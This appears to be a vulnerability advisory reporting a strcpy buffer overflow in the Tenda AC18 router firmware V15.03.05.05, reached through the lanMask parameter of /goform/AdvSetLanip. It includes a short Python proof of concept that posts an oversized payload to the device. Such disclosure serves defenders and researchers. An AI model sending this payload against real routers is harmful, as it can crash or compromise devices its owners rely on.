## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a buffer overflow vulnerability in the `fromadvsetlanip ` function. The `Var` variable receives the `lanMask` parameter from a POST request and is later passed to the `strcpy` function. However, since the Since user can control the input of  `lanMask`, the statemeant `strcpy((char *)&a4[38 * a3 + 2] + 2, a1);` can cause a buffer overflow.

![image-20250603000520280](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250603000520280.png)

![image-20250603000617375](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250603000617375.png)

![image-20250603000627892](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250603000627892.png)

## POC

```python
import requests

ip = "192.168.1.1"

url = f'http://{ip}/goform/AdvSetLanip'
payload = b'a' * 1000
data = {
    'lanMask':payload
}

requests.post(url, data=data)
```

![image-20250603000202009](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250603000202009.png)
